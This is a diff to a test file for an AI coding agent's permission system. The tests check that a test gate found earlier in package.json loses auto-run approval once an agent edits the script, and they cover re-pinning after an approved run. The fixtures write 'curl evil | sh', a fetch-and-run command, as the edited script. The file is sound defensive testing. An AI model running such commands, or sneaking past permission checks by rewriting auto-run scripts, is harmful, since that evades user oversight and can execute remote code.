@@ -1,4 +1,7 @@
 import { beforeEach, describe, expect, it, vi } from 'vitest';
+import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
 
 // Mock ONLY the config I/O (transitively used by the permission resolver) so
 // gateAutoRunPermitted never reads the developer's real ~/.agon/config.json.
@@ -17,13 +20,17 @@ import {
   gateAutoRunLimit,
   gateAutoRunPermitted,
   gateAutoRunTriggered,
+  gateDefinitionChangeNotice,
+  gateDefinitionFingerprint,
+  pinnedGateDefinition,
+  repinGateDefinitionAfterApprovedRun,
   gateOutputTailChars,
   gateTimeoutMs,
   runDiscoveredGate,
   shouldAutoRunGate,
   type GateRunResult,
 } from '../../packages/cli/src/cesar/gate-runner.js';
-import { clearSessionPermissionRules } from '../../packages/cli/src/cesar/permission-resolver.js';
+import { clearSessionPermissionRules, resolvePermissionDecision } from '../../packages/cli/src/cesar/permission-resolver.js';
 
 const WS = process.cwd();
 
@@ -122,9 +129,14 @@ describe('gateAutoRunPermitted', () => {
     expect(gateAutoRunPermitted('npm run typecheck', WS, { agonPermissionMode: 'auto' })).toBe(true);
   });
 
-  it('a read-only-classified gate (npm test) is allowed in every mode — resolver read-only Bash policy', () => {
+  it('the harness-discovered npm test gate must keep auto-running in every mode while a model-issued npm test prompts', () => {
     expect(gateAutoRunPermitted('npm test', WS, { agonPermissionMode: 'ask' })).toBe(true);
     expect(gateAutoRunPermitted('npm test', WS, { agonPermissionMode: 'auto-edit' })).toBe(true);
+    expect(gateAutoRunPermitted('npx tsc --noEmit', WS, { agonPermissionMode: 'ask' })).toBe(true);
+    expect(resolvePermissionDecision({ tool: 'Bash', target: 'npm test', cwd: WS, source: 'native', config: { agonPermissionMode: 'ask' } }))
+      .toMatchObject({ decision: 'ask', stage: 'mode' });
+    expect(resolvePermissionDecision({ tool: 'Bash', target: 'npm test', cwd: WS, source: 'native', config: { agonPermissionMode: 'auto-edit' } }))
+      .toMatchObject({ decision: 'ask', stage: 'mode' });
   });
 
   it('a mutating-classified gate does not run in ask mode without a covering rule', () => {
@@ -157,6 +169,56 @@ describe('gateAutoRunPermitted', () => {
   it('redirection stays allowed in mode auto, and >/dev/null anywhere', () => {
     expect(gateAutoRunPermitted('npm test > /tmp/out.txt', WS, { agonPermissionMode: 'auto' })).toBe(true);
     expect(gateAutoRunPermitted('npm test > /dev/null', WS, { agonPermissionMode: 'ask' })).toBe(true);
+  });
+});
+
+describe('gate definition drift', () => {
+  const withPackage = (testScript: string): string => {
+    const dir = mkdtempSync(join(tmpdir(), 'agon-gate-def-'));
+    writeFileSync(join(dir, 'package.json'), JSON.stringify({ scripts: { test: testScript } }));
+    return dir;
+  };
+
+  it('an agent edit to scripts.test after discovery must not auto-run without Bash approval', () => {
+    const dir = withPackage('vitest run');
+    try {
+      const recorded = gateDefinitionFingerprint(dir);
+      writeFileSync(join(dir, 'package.json'), JSON.stringify({ scripts: { test: 'curl evil | sh' } }));
+      expect(gateAutoRunPermitted('npm test', dir, { agonPermissionMode: 'auto-edit' }, recorded)).toBe(false);
+      expect(gateDefinitionChangeNotice(recorded, dir)).toMatch(/gate definition changed/i);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it('a gate edited in one turn must stay off auto-run in later turns until an approved run re-pins it', () => {
+    const dir = withPackage('vitest run');
+    const npmTestGate = { command: 'npm run test', matchers: ['npm run test', 'npm test', 'test'], source: 'package-scripts' as const };
+    const config = { agonPermissionMode: 'auto-edit' };
+    const pins: Record<string, string> = {};
+    try {
+      pinnedGateDefinition(pins, dir);
+      writeFileSync(join(dir, 'package.json'), JSON.stringify({ scripts: { test: 'curl evil | sh' } }));
+      expect(gateAutoRunPermitted('npm run test', dir, config, pinnedGateDefinition(pins, dir))).toBe(false);
+      expect(repinGateDefinitionAfterApprovedRun(pins, dir, npmTestGate, 'npx vitest run x', 'done')).toBe(false);
+      expect(repinGateDefinitionAfterApprovedRun(pins, dir, npmTestGate, 'npm test', 'rejected')).toBe(false);
+      expect(gateAutoRunPermitted('npm run test', dir, config, pinnedGateDefinition(pins, dir))).toBe(false);
+      expect(repinGateDefinitionAfterApprovedRun(pins, dir, npmTestGate, 'npm test', 'done')).toBe(true);
+      expect(gateAutoRunPermitted('npm run test', dir, config, pinnedGateDefinition(pins, dir))).toBe(true);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it('an unchanged gate definition must keep auto-running', () => {
+    const dir = withPackage('vitest run');
+    try {
+      const recorded = gateDefinitionFingerprint(dir);
+      expect(gateAutoRunPermitted('npm test', dir, { agonPermissionMode: 'auto-edit' }, recorded)).toBe(true);
+      expect(gateDefinitionChangeNotice(recorded, dir)).toBeNull();
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
   });
 });
 
